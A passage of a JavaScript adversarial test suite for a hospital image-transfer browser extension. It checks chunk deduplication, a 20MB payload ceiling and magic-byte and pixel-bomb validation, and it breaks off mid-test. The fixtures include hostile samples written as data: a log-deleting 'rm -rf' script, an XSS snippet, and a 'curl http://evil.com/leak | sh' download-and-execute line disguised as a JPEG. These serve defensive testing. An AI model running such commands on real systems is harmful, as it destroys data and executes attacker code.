/**
 * HIS CamSync — Challenger M3-2 Adversarial Stress Suite
 * Focus: Bounds, Magic Bytes, Pixel Bomb Defense & Unencrypted Fail-Closed
 *
 * Verifies:
 * 1. Conflicting duplicate chunks (same index, different data) -> aborts with CONFLICTING_CHUNK_DATA
 * 2. Identical duplicate chunks (same index, identical data) -> accepted idempotently without corrupting count
 * 3. Cumulative ciphertext payload > 20MB -> terminates with MAX_PAYLOAD_EXCEEDED
 * 4. Magic byte evasion (shell script, PDF, HTML disguised as JPEG/PNG) -> rejected with INVALID_IMAGE_MAGIC_BYTES
 * 5. Pixel bomb defense (JPEG SOF0 > 16MP or > 8192px, PNG IHDR > 8192px) -> rejected with PIXEL_BOMB_DETECTED
 * 6. Explicit unencrypted transfer (encrypted: false) -> fails closed with 0 files injected
 */

import vm from 'node:vm';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { EventEmitter } from 'node:events';
import { fileURLToPath } from 'node:url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ============================================================================
// Reporter
// ============================================================================

class ChallengerReporter {
  constructor() {
    this.results = [];
    this.startTime = Date.now();
    this.currentGroup = '';
  }

  group(name) {
    this.currentGroup = name;
    console.log(`\n\x1b[1m\x1b[35m▶ ${name}\x1b[0m`);
  }

  record(id, name, passed, details = '', error = null) {
    this.results.push({ id, group: this.currentGroup, name, passed, details, error });
    const mark = passed ? '\x1b[32m✔ [PASS]\x1b[0m' : '\x1b[31m✖ [FAIL]\x1b[0m';
    console.log(`  ${mark} \x1b[1m${id}\x1b[0m: ${name}`);
    if (details) {
      console.log(`     \x1b[90m${details}\x1b[0m`);
    }
    if (error) {
      console.log(`     \x1b[31mError: ${error.stack || error.message || error}\x1b[0m`);
    }
  }

  summary() {
    const total = this.results.length;
    const passed = this.results.filter(r => r.passed).length;
    const failed = total - passed;
    const duration = ((Date.now() - this.startTime) / 1000).toFixed(2);

    console.log('\n' + '═'.repeat(74));
    console.log('\x1b[1m\x1b[37m  Challenger M3-2 Adversarial Stress Suite — Execution Summary\x1b[0m');
    console.log('═'.repeat(74));
    console.log(`  Total Invariant Checks: ${total}`);
    console.log(`  Passed Checks:          \x1b[32m${passed}\x1b[0m`);
    console.log(`  Failed Checks:          ${failed > 0 ? `\x1b[31m${failed}\x1b[0m` : `\x1b[32m0\x1b[0m`}`);
    console.log(`  Execution Duration:     ${duration}s`);
    console.log('═'.repeat(74));

    if (failed === 0) {
      console.log('\x1b[1m\x1b[42m\x1b[30m  ✔ CHALLENGER M3-2 STRESS SUITE 100% VERIFIED  \x1b[0m\n');
      return true;
    } else {
      console.log(`\x1b[1m\x1b[41m\x1b[37m  ✖ CHALLENGER M3-2 DETECTED ${failed} FAILURES  \x1b[0m\n`);
      return false;
    }
  }
}

const reporter = new ChallengerReporter();

// ============================================================================
// Synthetic Binary Generators (JPEG SOF0 & PNG IHDR)
// ============================================================================

function createSyntheticJpeg(width = 800, height = 600) {
  const chunks = [];
  // SOI
  chunks.push(Buffer.from([0xFF, 0xD8]));
  // APP0 (JFIF)
  const app0 = Buffer.alloc(18);
  app0[0] = 0xFF; app0[1] = 0xE0;
  app0[2] = 0x00; app0[3] = 0x10;
  app0.write('JFIF\0', 4, 'ascii');
  app0[9] = 0x01; app0[10] = 0x02;
  chunks.push(app0);

  // SOF0 (Baseline DCT)
  const sof0 = Buffer.alloc(19);
  sof0[0] = 0xFF; sof0[1] = 0xC0;
  sof0[2] = 0x00; sof0[3] = 0x11; // segment length = 17
  sof0[4] = 0x08; // 8 bits/sample
  sof0.writeUInt16BE(height, 5);
  sof0.writeUInt16BE(width, 7);
  sof0[9] = 0x03; // 3 components
  sof0[10] = 1; sof0[11] = 0x11; sof0[12] = 0;
  sof0[13] = 2; sof0[14] = 0x11; sof0[15] = 1;
  sof0[16] = 3; sof0[17] = 0x11; sof0[18] = 1;
  chunks.push(sof0);

  // EOI
  chunks.push(Buffer.from([0xFF, 0xD9]));
  return Buffer.concat(chunks);
}

function createSyntheticPng(width = 800, height = 600) {
  const chunks = [];
  // PNG signature
  chunks.push(Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]));
  // IHDR
  const ihdr = Buffer.alloc(25);
  ihdr.writeUInt32BE(13, 0);
  ihdr.write('IHDR', 4, 'ascii');
  ihdr.writeUInt32BE(width, 8);
  ihdr.writeUInt32BE(height, 12);
  ihdr[16] = 8;
  ihdr[17] = 2;
  ihdr[18] = 0;
  ihdr[19] = 0;
  ihdr[20] = 0;
  ihdr.writeUInt32BE(0x12345678, 21);
  chunks.push(ihdr);
  // IEND
  const iend = Buffer.alloc(12);
  iend.writeUInt32BE(0, 0);
  iend.write('IEND', 4, 'ascii');
  iend.writeUInt32BE(0xAE426082, 8);
  chunks.push(iend);
  return Buffer.concat(chunks);
}

// ============================================================================
// Sandbox & Environment Mock Factory
// ============================================================================

class MockDataConnection extends EventEmitter {
  constructor(peerId) {
    super();
    this.peer = peerId;
    this.open = true;
    this.sent = [];
  }
  send(data) {
    this.sent.push(data);
    this.emit('sent', data);
  }
  close() {
    this.open = false;
    this.emit('close');
  }
  simulateData(payload) {
    this.emit('data', payload);
  }
}

class MockPeer extends EventEmitter {
  constructor(id, options) {
    super();
    this.id = id;
    this.options = options;
    this.destroyed = false;
    this.activeConn = null;
    setTimeout(() => {
      this.emit('open', this.id);
    }, 0);
  }
  connectSimulatedPhone() {
    const conn = new MockDataConnection('phone_peer');
    this.activeConn = conn;
    this.emit('connection', conn);
    setTimeout(() => {
      conn.emit('open');
    }, 0);
    return conn;
  }
  destroy() {
    this.destroyed = true;
    if (this.activeConn) {
      this.activeConn.close();
      this.activeConn = null;
    }
    this.emit('close');
  }
}

function createChallengerEnvironment(options = {}) {
  const elements = {};
  let activeWebSocket = null;
  let activePeerInstance = null;
  const patientText = options.patientText || 'Mã bệnh nhân: 998877 - Tên bệnh nhân: TRAN THI THU - Tuổi: 32';
  let uploadClickCount = 0;

  function createElement(tag) {
    let _innerHtml = '';
    const el = {
      tagName: tag.toUpperCase(),
      id: '',
      className: '',
      style: {},
      dataset: {},
      parentNode: null,
      classList: {
        add: (c) => { if (!el.className.includes(c)) el.className = (el.className + ' ' + c).trim(); },
        remove: (c) => { el.className = el.className.replace(new RegExp(`\\b${c}\\b`, 'g'), '').trim(); },
        contains: (c) => el.className.includes(c)
      },
      children: [],
      appendChild: (child) => {
        child.parentNode = el;
        el.children.push(child);
        return child;
      },
      removeChild: (child) => {
        el.children = el.children.filter(c => c !== child);
        child.parentNode = null;
        return child;
      },
      remove: () => {
        if (el.parentNode) {
          el.parentNode.removeChild(el);
        }
      },
      addEventListener: () => {},
      removeEventListener: () => {},
      click: () => {
        if (el.id === 'btnUpload') uploadClickCount++;
      },
      setAttribute: (k, v) => { el[k] = v; },
      getAttribute: (k) => el[k] || null,
      querySelector: (sel) => {
        if (sel.startsWith('#')) return elements[sel.slice(1)] || null;
        return null;
      },
      querySelectorAll: () => []
    };

    Object.defineProperty(el, 'innerHTML', {
      get: () => _innerHtml,
      set: (val) => {
        _innerHtml = val;
        const idMatches = [...val.matchAll(/id=["']([^"']+)["']/g)];
        for (const m of idMatches) {
          if (!elements[m[1]]) {
            const childEl = createElement('div');
            childEl.id = m[1];
            elements[m[1]] = childEl;
          }
        }
      }
    });

    return el;
  }

  const mockDoc = {
    readyState: 'complete',
    getElementById: (id) => elements[id] || null,
    querySelector: (sel) => {
      if (sel.startsWith('#')) return elements[sel.slice(1)] || null;
      if (sel === '.camsync-toast') return elements['toast'] || null;
      if (sel === '#patientBanner' || sel === '#thongtinbenhnhan' || sel === '#patientInfo' || sel === '#grdBenhNhan') {
        return elements['grdBenhNhan'] || { innerText: patientText };
      }
      return null;
    },
    querySelectorAll: () => [],
    createElement,
    body: {
      appendChild: function (c) {
        c.parentNode = this;
        if (c.id) elements[c.id] = c;
        return c;
      },
      removeChild: function (c) {
        if (c.id) delete elements[c.id];
        return c;
      },
      get innerText() { return patientText; },
      set innerText(v) { patientText = v; }
    },
    __simulatePersistenceCommit: true,
    head: { appendChild() {} },
    addEventListener: () => {}
  };

  const patientBanner = createElement('div');
  patientBanner.id = 'grdBenhNhan';
  patientBanner.innerText = patientText;
  patientBanner.textContent = patientText;
  elements['grdBenhNhan'] = patientBanner;
  mockDoc.body.appendChild(patientBanner);

  const pMatch = patientText.match(/Mã bệnh nhân:\s*([A-Za-z0-9_.-]+)/i);
  const encMatch = patientText.match(/(?:Mã lượt khám|Mã vào viện|Số vào viện):\s*([A-Za-z0-9_.-]+)/i);
  if (pMatch && options.includeEncounter !== false) {
    const pid = pMatch[1];
    const encId = encMatch ? encMatch[1] : `LK_${pid}`;
    const maLuotKham = createElement('input');
    maLuotKham.id = 'maLuotKham';
    maLuotKham.value = encId;
    elements['maLuotKham'] = maLuotKham;
    mockDoc.body.appendChild(maLuotKham);
  }

  const fileUpload = createElement('input');
  fileUpload.id = 'fileUpload';
  fileUpload.type = 'file';
  fileUpload.files = [];
  elements['fileUpload'] = fileUpload;
  mockDoc.body.appendChild(fileUpload);

  const btnUpload = createElement('button');
  btnUpload.id = 'btnUpload';
  elements['btnUpload'] = btnUpload;
  mockDoc.body.appendChild(btnUpload);

  const gridUploadResults = createElement('div');
  gridUploadResults.id = 'gridUploadResults';
  elements['gridUploadResults'] = gridUploadResults;
  mockDoc.body.appendChild(gridUploadResults);

  class MockWebSocket extends EventEmitter {
    static OPEN = 1;
    static CLOSED = 3;
    constructor(url) {
      super();
      this.url = url;
      this.readyState = MockWebSocket.OPEN;
      this.sent = [];
      this.joinedTopics = new Set();
      activeWebSocket = this;
      setTimeout(() => {
        if (this.onopen) this.onopen();
        this.emit('open');
      }, 0);
    }
    send(data) {
      const parsed = typeof data === 'string' ? JSON.parse(data) : data;
      this.sent.push(parsed);
      if (parsed.event === 'phx_join' && parsed.topic) {
        this.joinedTopics.add(parsed.topic);
      }
      this.emit('sent', parsed);
    }
    close(code = 1000, reason = '') {
      this.readyState = MockWebSocket.CLOSED;
      this.joinedTopics.clear();
      if (this.onclose) this.onclose({ code, reason });
      this.emit('close', { code, reason });
    }
    simulateBroadcast(event, payload, topic = null) {
      const targetTopic = topic || Array.from(this.joinedTopics)[0] || 'realtime:camsync:mock';
      const eventData = {
        data: JSON.stringify({
          topic: targetTopic,
          event: 'broadcast',
          payload: { type: 'broadcast', event, payload }
        })
      };
      if (this.onmessage) this.onmessage(eventData);
      this.emit('message', eventData);
    }
  }

  class CustomMockPeer extends MockPeer {
    constructor(id, opts) {
      super(id, opts);
      activePeerInstance = this;
    }
  }

  const sandbox = {
    document: mockDoc,
    window: {
      location: { href: 'http://his.local/diagnostics' },
      addEventListener: () => {},
      crypto: globalThis.crypto.webcrypto || globalThis.crypto,
      WebSocket: MockWebSocket,
      Peer: CustomMockPeer,
      Buffer,
      Uint8Array,
      sessionStorage: {
        getItem: () => null,
        setItem: () => {},
        removeItem: () => {},
        clear: () => {}
      },
      confirm: () => true
    },
    sessionStorage: {
      getItem: () => null,
      setItem: () => {},
      removeItem: () => {},
      clear: () => {}
    },
    confirm: () => true,
    crypto: globalThis.crypto.webcrypto || globalThis.crypto,
    Buffer,
    Uint8Array,
    TextEncoder,
    TextDecoder,
    Peer: CustomMockPeer,
    WebSocket: MockWebSocket,
    navigator: { userAgent: 'Chrome/120.0', vibrate: () => {} },
    console: { log: () => {}, warn: () => {}, error: () => {} },
    setTimeout: (fn, delay) => setTimeout(fn, delay),
    clearTimeout: (id) => clearTimeout(id),
    setInterval: (fn, delay) => setInterval(fn, delay),
    clearInterval: (timer) => clearInterval(timer),
    atob: (s) => Buffer.from(s, 'base64').toString('binary'),
    btoa: (s) => Buffer.from(s, 'binary').toString('base64'),
    MutationObserver: class {
      observe() {}
      disconnect() {}
    },
    QRCode: class {
      makeCode() {}
      clear() {}
    },
    DataTransfer: class {
      constructor() {
        this.items = {
          _items: [],
          add: function(f) { this._items.push(f); }
        };
      }
      get files() { return this.items._items; }
    },
    File: class {
      constructor(parts, name, opts = {}) {
        this.parts = parts;
        this.name = name;
        this.type = opts.type || '';
        this.size = parts.reduce((acc, p) => acc + (p.length || p.byteLength || 0), 0);
      }
    }
  };

  const cryptoPath = path.resolve(__dirname, '../extension/content/crypto-utils.js');
  const auditPath = path.resolve(__dirname, '../extension/content/audit-logger.js');
  const clinicalPath = path.resolve(__dirname, '../extension/content/clinical-guard.js');
  const hisPath = path.resolve(__dirname, '../extension/content/his-adapter.js');
  const transferPath = path.resolve(__dirname, '../extension/content/transfer-receiver.js');
  const extensionPath = path.resolve(__dirname, '../extension/content/camsync-content.js');

  const cryptoCode = fs.readFileSync(cryptoPath, 'utf8');
  const auditCode = fs.readFileSync(auditPath, 'utf8');
  const clinicalCode = fs.readFileSync(clinicalPath, 'utf8');
  const hisCode = fs.readFileSync(hisPath, 'utf8');
  const transferCode = fs.readFileSync(transferPath, 'utf8');
  let extensionCode = fs.readFileSync(extensionPath, 'utf8');
  // Synthetic transport fixture: exercises protocol logic, not channel authorization.
  extensionCode = extensionCode.replace("if (activeClinicalSession?.channelStatus !== 'PRIVATE_CHANNEL_READY') return;", '/* synthetic authorized channel */');

  extensionCode = extensionCode.replace('function openQrModal() {', 'window.__openQrModal = openQrModal; function openQrModal() {');
  extensionCode = extensionCode.replace('function closeQrModal() {', 'window.__closeQrModal = closeQrModal; function closeQrModal() {');
  extensionCode = extensionCode.replace('let activeSessionId = null;', 'let activeSessionId = null; window.__getActiveSessionId = () => activeSessionId;');
  extensionCode = extensionCode.replace('let activeClinicalSession = null;', 'let activeClinicalSession = null; window.__getClinicalSession = () => activeClinicalSession;');
  extensionCode = extensionCode.replace('let photoCount = 0;', 'let photoCount = 0; window.__getPhotoCount = () => photoCount;');
  extensionCode = extensionCode.replace('let receivedPhotos = [];', 'let receivedPhotos = []; window.__getReceivedPhotos = () => receivedPhotos;');

  const context = vm.createContext(sandbox);
  vm.runInContext(cryptoCode, context);
  vm.runInContext(auditCode, context);
  vm.runInContext(clinicalCode, context);
  vm.runInContext(hisCode, context);
  vm.runInContext(transferCode, context);

  sandbox.window.__generateEncryptionKeyHex = sandbox.window.__CamSyncCrypto.generateEncryptionKeyHex;
  sandbox.window.__importAesGcmKey = sandbox.window.__CamSyncCrypto.importAesGcmKey;
  sandbox.window.__decryptAesGcmPayload = sandbox.window.__CamSyncCrypto.decryptAesGcmPayload;

  vm.runInContext(extensionCode, context);

  return {
    context,
    sandbox,
    elements,
    fileUpload,
    btnUpload,
    CamSyncTransfer: sandbox.window.__CamSyncTransfer,
    CamSyncCrypto: sandbox.window.__CamSyncCrypto,
    getUploadClickCount: () => uploadClickCount,
    getActiveWebSocket: () => activeWebSocket,
    getActivePeer: () => activePeerInstance,
    openModal: () => sandbox.window.__openQrModal(),
    closeModal: () => sandbox.window.__closeQrModal(),
    getClinicalSession: () => sandbox.window.__getClinicalSession(),
    getActiveSessionId: () => sandbox.window.__getActiveSessionId(),
    getPhotoCount: () => sandbox.window.__getPhotoCount(),
    getReceivedPhotos: () => sandbox.window.__getReceivedPhotos(),
    cleanup: () => {
      try { sandbox.window.__closeQrModal(); } catch (e) {}
      if (activeWebSocket) activeWebSocket.close();
      if (activePeerInstance) activePeerInstance.destroy();
    }
  };
}

// ============================================================================
// TEST SUITES
// ============================================================================

async function runAllTests() {
  console.log('\n══════════════════════════════════════════════════════════════════════════');
  console.log('  HIS CamSync — Milestone 3 Empirical Challenger Adversarial Suite');
  console.log('  Bounds • Duplicate Detection • Magic Bytes • Pixel Bomb • E2EE G1');
  console.log('══════════════════════════════════════════════════════════════════════════');

  const baseEnv = createChallengerEnvironment();
  const CamSyncTransfer = baseEnv.CamSyncTransfer;
  const CamSyncCrypto = baseEnv.CamSyncCrypto;
  const UnifiedTransferReceiver = CamSyncTransfer.UnifiedTransferReceiver;

  // --------------------------------------------------------------------------
  // SUITE 1: Conflicting vs Identical Duplicate Chunks & Bounds Stress
  // --------------------------------------------------------------------------
  reporter.group('SUITE 1: Conflicting Duplicate Chunks & Idempotency');

  // Test 1.1: Conflicting duplicate chunk aborts immediately with CONFLICTING_CHUNK_DATA
  try {
    let errorCalled = false;
    let errorCode = null;
    let ackResult = null;

    const transfers = {};
    const receiver = new UnifiedTransferReceiver(transfers, {
      onError: (tid, tx, code) => {
        errorCalled = true;
        errorCode = code;
      }
    });

    const tid = 'tx_conflict_01';
    receiver.begin({
      transferId: tid,
      totalChunks: 3,
      encryptedBytes: 5000,
      v: 2,
      sendAck: (ok, code, payload) => {
        ackResult = { ok, code, payload };
      }
    });

    // Chunk 0 accepted
    const r1 = receiver.acceptChunk(tid, 0, 'DATA_CHUNK_0_INITIAL');
    // Chunk 0 re-sent with DIFFERENT data
    const r2 = receiver.acceptChunk(tid, 0, 'DATA_CHUNK_0_MUTATED');

    const pass = (
      r1 === true &&
      r2 === false &&
      errorCalled === true &&
      errorCode === 'CONFLICTING_CHUNK_DATA' &&
      ackResult &&
      ackResult.ok === false &&
      ackResult.code === 'CONFLICTING_CHUNK_DATA' &&
      ackResult.payload.status === 'HIS_REJECTED' &&
      transfers[tid] === undefined // cleaned up
    );

    reporter.record(
      'TC-CHALLENGE-1.1',
      'Conflicting duplicate chunk (same index, different data) immediately aborts with CONFLICTING_CHUNK_DATA',
      pass,
      `r1=${r1}, r2=${r2}, code=${errorCode}, ackStatus=${ackResult?.payload?.status}, cleanedUp=${transfers[tid] === undefined}`
    );
  } catch (err) {
    reporter.record('TC-CHALLENGE-1.1', 'Conflicting duplicate chunk', false, '', err);
  }

  // Test 1.2: Conflicting duplicate chunk via unified ingest()
  try {
    let errorCalled = false;
    let errorCode = null;
    let lastAck = null;

    const transfers = {};
    const receiver = new UnifiedTransferReceiver(transfers, {
      onError: (tid, tx, code) => {
        errorCalled = true;
        errorCode = code;
      }
    });

    const tid = 'tx_ingest_conflict';
    const sid = 'sess_conflict_ingest';

    receiver.ingest({
      v: 2,
      sid,
      transferId: tid,
      type: 'TransferStart',
      totalChunks: 3,
      encryptedBytes: 4000
    }, {
      sendAck: (ok, code, payload) => { lastAck = { ok, code, payload }; }
    });

    const p1 = receiver.ingest({ v: 2, sid, transferId: tid, type: 'TransferChunk', index: 1, data: 'PAYLOAD_AAA' });
    const p2 = receiver.ingest({ v: 2, sid, transferId: tid, type: 'TransferChunk', index: 1, data: 'PAYLOAD_BBB_CONFLICT' });

    const pass = (
      p1 === true &&
      p2 === false &&
      errorCalled === true &&
      errorCode === 'CONFLICTING_CHUNK_DATA' &&
      lastAck?.code === 'CONFLICTING_CHUNK_DATA'
    );

    reporter.record(
      'TC-CHALLENGE-1.2',
      'UnifiedTransferReceiver.ingest() detects conflicting chunk and halts transfer fail-closed',
      pass,
      `p1=${p1}, p2=${p2}, errorCode=${errorCode}, lastAckCode=${lastAck?.code}`
    );
  } catch (err) {
    reporter.record('TC-CHALLENGE-1.2', 'Ingest conflict check', false, '', err);
  }

  // Test 1.3: Identical duplicate chunks are accepted idempotently without corrupting count
  try {
    const transfers = {};
    let errorCalled = false;
    const receiver = new UnifiedTransferReceiver(transfers, {
      onError: () => { errorCalled = true; }
    });

    const tid = 'tx_idempotent_01';
    receiver.begin({
      transferId: tid,
      totalChunks: 3,
      encryptedBytes: 3000,
      v: 2
    });

    // Accept chunk 0
    const r1 = receiver.acceptChunk(tid, 0, 'EXACT_SAME_DATA');
    const countAfterFirst = transfers[tid].received;

    // Send chunk 0 again 3 times with identical data
    const r2 = receiver.acceptChunk(tid, 0, 'EXACT_SAME_DATA');
    const r3 = receiver.acceptChunk(tid, 0, 'EXACT_SAME_DATA');
    const r4 = receiver.acceptChunk(tid, 0, 'EXACT_SAME_DATA');
    const countAfterDuplicates = transfers[tid].received;

    const pass = (
      r1 === true && r2 === true && r3 === true && r4 === true &&
      countAfterFirst === 1 &&
      countAfterDuplicates === 1 &&
      errorCalled === false &&
      transfers[tid].chunks[0] === 'EXACT_SAME_DATA'
    );

    reporter.record(
      'TC-CHALLENGE-1.3',
      'Identical duplicate chunks (same index, identical data) accepted idempotently (count uncorrupted: 1)',
      pass,
      `r1..r4=true, countFirst=${countAfterFirst}, countDupes=${countAfterDuplicates}, errorCalled=${errorCalled}`
    );
  } catch (err) {
    reporter.record('TC-CHALLENGE-1.3', 'Identical duplicate check', false, '', err);
  }

  // Test 1.4: Full multi-chunk assembly succeeds despite redundant duplicate chunk arrivals
  try {
    let assembledPayload = null;
    const transfers = {};
    const receiver = new UnifiedTransferReceiver(transfers, {
      onAssembled: (data) => { assembledPayload = data; }
    });

    const tid = 'tx_assembly_dupes';
    receiver.begin({ transferId: tid, totalChunks: 3, encryptedBytes: 300, v: 2 });

    // Send chunks with heavy duplicates
    receiver.acceptChunk(tid, 0, 'CHUNK_A_');
    receiver.acceptChunk(tid, 0, 'CHUNK_A_'); // duplicate
    receiver.acceptChunk(tid, 1, 'CHUNK_B_');
    receiver.acceptChunk(tid, 1, 'CHUNK_B_'); // duplicate
    receiver.acceptChunk(tid, 0, 'CHUNK_A_'); // duplicate
    receiver.acceptChunk(tid, 2, 'CHUNK_C');
    receiver.complete(tid);

    const pass = (
      assembledPayload !== null &&
      assembledPayload.fullBase64 === 'CHUNK_A_CHUNK_B_CHUNK_C' &&
      assembledPayload.transferId === tid
    );

    reporter.record(
      'TC-CHALLENGE-1.4',
      'Full reassembly completes successfully with bit-exact string under redundant identical chunk bombardment',
      pass,
      `assembled=${assembledPayload?.fullBase64}`
    );
  } catch (err) {
    reporter.record('TC-CHALLENGE-1.4', 'Multi-chunk duplicate assembly', false, '', err);
  }

  // --------------------------------------------------------------------------
  // SUITE 2: Cumulative Ciphertext Payload Bounds (> 20MB Defense)
  // --------------------------------------------------------------------------
  reporter.group('SUITE 2: Cumulative 20MB Ciphertext Payload Ceiling');

  // Test 2.1: Declared size > 20MB at begin() is rejected immediately at handshake
  try {
    let ackResult = null;
    const transfers = {};
    const receiver = new UnifiedTransferReceiver(transfers);
    const tid = 'tx_declared_too_large';

    const ok = receiver.begin({
      transferId: tid,
      totalChunks: 250,
      encryptedBytes: 25 * 1024 * 1024, // 25MB > 20MB
      v: 2,
      sendAck: (status, code, payload) => { ackResult = { status, code, payload }; }
    });

    const pass = (
      ok === false &&
      transfers[tid] === undefined &&
      ackResult &&
      ackResult.status === false &&
      ackResult.code === 'MAX_PAYLOAD_EXCEEDED' &&
      ackResult.payload.status === 'HIS_REJECTED'
    );

    reporter.record(
      'TC-CHALLENGE-2.1',
      'Declared payload > 20MB at begin() rejected immediately at handshake with MAX_PAYLOAD_EXCEEDED',
      pass,
      `beginOk=${ok}, ackCode=${ackResult?.code}, status=${ackResult?.payload?.status}`
    );
  } catch (err) {
    reporter.record('TC-CHALLENGE-2.1', 'Handshake 20MB ceiling', false, '', err);
  }

  // Test 2.2: Sneaky sender: declares small size, but streams cumulative ciphertext > 20MB
  try {
    let errorCalled = false;
    let errorCode = null;
    let ackResult = null;

    const transfers = {};
    const receiver = new UnifiedTransferReceiver(transfers, {
      onError: (tid, tx, code) => {
        errorCalled = true;
        errorCode = code;
      }
    });

    const tid = 'tx_sneaky_huge_payload';
    const chunkSize = 90 * 1024; // 90KB <= MAX_CHUNK_BYTES (100KB)
    const totalChunks = 250;

    // Sender claims 5MB so begin() passes
    const beginOk = receiver.begin({
      transferId: tid,
      totalChunks,
      encryptedBytes: 5 * 1024 * 1024,
      v: 2,
      sendAck: (ok, code, payload) => { ackResult = { ok, code, payload }; }
    });

    const dummyChunk = 'X'.repeat(chunkSize);
    let acceptedCount = 0;
    let failureIndex = -1;

    for (let i = 0; i < totalChunks; i++) {
      const ok = receiver.acceptChunk(tid, i, dummyChunk);
      if (ok) {
        acceptedCount++;
      } else {
        failureIndex = i;
        break;
      }
    }

    // 20 * 1024 * 1024 = 20,971,520 bytes.
    // 20,971,520 / 92160 = 227.55 -> Chunks 0..226 (227 chunks) accepted = 20,920,320 bytes.
    // Chunk 227 pushes total to 21,012,480 bytes (> 20MB), so Chunk 227 is rejected!
    const pass = (
      beginOk === true &&
      failureIndex === 227 &&
      acceptedCount === 227 &&
      errorCalled === true &&
      errorCode === 'MAX_PAYLOAD_EXCEEDED' &&
      ackResult?.code === 'MAX_PAYLOAD_EXCEEDED' &&
      ackResult?.payload?.status === 'HIS_REJECTED' &&
      transfers[tid] === undefined
    );

    reporter.record(
      'TC-CHALLENGE-2.2',
      'Streaming cumulative ciphertext payload > 20MB halts immediately at threshold with MAX_PAYLOAD_EXCEEDED',
      pass,
      `failureIndex=${failureIndex} (expected 228), accepted=${acceptedCount}, errorCode=${errorCode}, status=${ackResult?.payload?.status}`
    );
  } catch (err) {
    reporter.record('TC-CHALLENGE-2.2', 'Streaming 20MB cumulative payload cap', false, '', err);
  }

  // Test 2.3: Boundary exact test: exactly 20MB accepted, 20MB + 1 byte rejected
  try {
    let errorReported = null;
    const transfers = {};
    const receiver = new UnifiedTransferReceiver(transfers, {
      onError: (tid, tx, code) => { errorReported = code; }
    });
    const tid = 'tx_boundary_20mb';
    const MAX_CAP = 20 * 1024 * 1024; // 20,971,520 bytes

    receiver.begin({ transferId: tid, totalChunks: 211, encryptedBytes: 10 * 1024 * 1024, v: 2 });

    // Send 200 chunks of 100,000 bytes = 20,000,000 bytes
    const c100k = 'B'.repeat(100000);
    for (let i = 0; i < 200; i++) {
      receiver.acceptChunk(tid, i, c100k);
    }
    // Remaining to cap: 971,520 bytes in 10 chunks of 97,152 bytes:
    const c97k = 'C'.repeat(97152);
    for (let i = 200; i < 210; i++) {
      receiver.acceptChunk(tid, i, c97k);
    }

    const exactCapReached = transfers[tid]?.totalCiphertextBytes === MAX_CAP;
    // Now send 1 extra byte (index 210)
    const rejectNext = receiver.acceptChunk(tid, 210, 'Z');

    const pass = (
      exactCapReached === true &&
      rejectNext === false &&
      errorReported === 'MAX_PAYLOAD_EXCEEDED' &&
      transfers[tid] === undefined
    );

    reporter.record(
      'TC-CHALLENGE-2.3',
      'Boundary verification: exactly 20,971,520 bytes tolerated; 20,971,521st byte triggers immediate abort',
      pass,
      `exactCapReached=${exactCapReached}, rejectNext=${rejectNext}, errorReported=${errorReported}`
    );
  } catch (err) {
    reporter.record('TC-CHALLENGE-2.3', 'Boundary 20MB exact', false, '', err);
  }

  // --------------------------------------------------------------------------
  // SUITE 3: Magic Byte Evasion & Polyglot File Rejection
  // --------------------------------------------------------------------------
  reporter.group('SUITE 3: Magic Byte Evasion & Polyglot Rejection');

  // Test 3.1: Unit-level Magic Byte validation across various attack payloads
  const attackVectors = [
    { name: 'Shell script disguise', data: Buffer.from('#!/bin/bash\nrm -rf /var/log\nexit 0\n'), expected: false },
    { name: 'PDF document disguise', data: Buffer.from('%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n'), expected: false },
    { name: 'HTML script injection', data: Buffer.from('<!DOCTYPE html><html><script>alert("xss")</script></html>'), expected: false },
    { name: 'ELF executable binary', data: Buffer.from([0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00]), expected: false },
    { name: 'Truncated short payload (3 bytes)', data: Buffer.from([0xFF, 0xD8, 0x00]), expected: false },
    { name: 'Zero-byte empty payload', data: Buffer.from([]), expected: false },
    { name: 'Valid JPEG signature', data: createSyntheticJpeg(800, 600), expected: true, expectedMime: 'image/jpeg' },
    { name: 'Valid PNG signature', data: createSyntheticPng(800, 600), expected: true, expectedMime: 'image/png' }
  ];

  for (const [idx, v] of attackVectors.entries()) {
    try {
      const res = CamSyncCrypto.validateImageMagicBytes(v.data);
      const pass = res.valid === v.expected && (!v.expectedMime || res.mimeType === v.expectedMime);
      reporter.record(
        `TC-CHALLENGE-3.1.${idx + 1}`,
        `Magic byte verification for "${v.name}" -> ${v.expected ? 'ACCEPT' : 'REJECT'}`,
        pass,
        `valid=${res.valid} (expected ${v.expected}), mimeType=${res.mimeType || 'none'}, error=${res.error || 'none'}`
      );
    } catch (err) {
      reporter.record(`TC-CHALLENGE-3.1.${idx + 1}`, `Magic byte: ${v.name}`, false, '', err);
    }
  }

  // Test 3.2: Full Pipeline Magic Byte Enforcement: Disguised Bash script via WebRTC
  try {
    const desktopEnv = createChallengerEnvironment();
    desktopEnv.openModal();
    await new Promise(r => setTimeout(r, 20));

    const peer = desktopEnv.getActivePeer();
    const conn = peer.connectSimulatedPhone();
    await new Promise(r => setTimeout(r, 20));

    const session = desktopEnv.getClinicalSession();
    const cryptoKey = session.cryptoKey;
    const sid = session.sessionId;
    const tid = 'tx_disguised_script';

    // Disguised shell script inside encrypted JSON container
    const maliciousScript = '#!/bin/bash\ncurl http://evil.com/leak | sh\n';
    const fakeContainer = JSON.stringify({
      image: maliciousScript,
      mimeType: 'image/jpeg',
      meta: { patientId: '998877' }
    });

    const aad = { v: 2, sid, transferId: tid, contentType: 'image/jpeg' };
    const encRes = await CamSyncCrypto.encryptAesGcmPayload(cryptoKey, fakeContainer, aad);

    conn.simulateData({
      v: 2,
      sid,
      transferId: tid,
      type: 'TransferStart',
      totalChunks: 1,
      encryptedBytes: encRes.data.length,
      contentType: 'image/jpeg',
      encrypted: true,
      iv: encRes.iv
    });

    conn.simulateData({
      v: 2,
      sid,
      transferId: tid,
      type: 'TransferChunk',
      index: 0,
      data: encRes.data,
      encrypted: true,
      iv: encRes.iv
    });

    conn.simulateData({
      v: 2,
      sid,
      transferId: tid,
      type: 'TransferEnd'
    });

    await new Promise(r => setTimeout(r, 40));

    const ack = conn.sent.find(m => m.transferId === tid || m.type === 'TRANSFER_ACK');
    const filesAttached = desktopEnv.elements.fileUpload.files.length;
    const uploadsClicked = desktopEnv.getUploadClickCount();

    const pass = (
      ack !== undefined &&
